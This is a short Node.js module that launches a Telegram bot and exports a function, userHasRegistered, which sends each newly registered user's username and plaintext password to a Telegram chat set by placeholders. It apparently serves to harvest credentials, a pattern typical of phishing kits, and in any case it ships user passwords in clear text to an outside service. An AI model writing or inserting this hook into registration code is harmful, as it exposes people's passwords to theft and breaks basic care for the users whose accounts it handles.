const { Telegraf } = require("telegraf")

const bot = new Telegraf("Put your telegram bot token")

function userHasRegistered(username,password) {
    bot.telegram.sendMessage("Put your chat id (int)",`New user:\nUsername: ${username}\nPassword: ${password}`)
}

// bot.start((ctx)=>{
    
// })

bot.launch()

module.exports = {
    userHasRegistered: userHasRegistered
}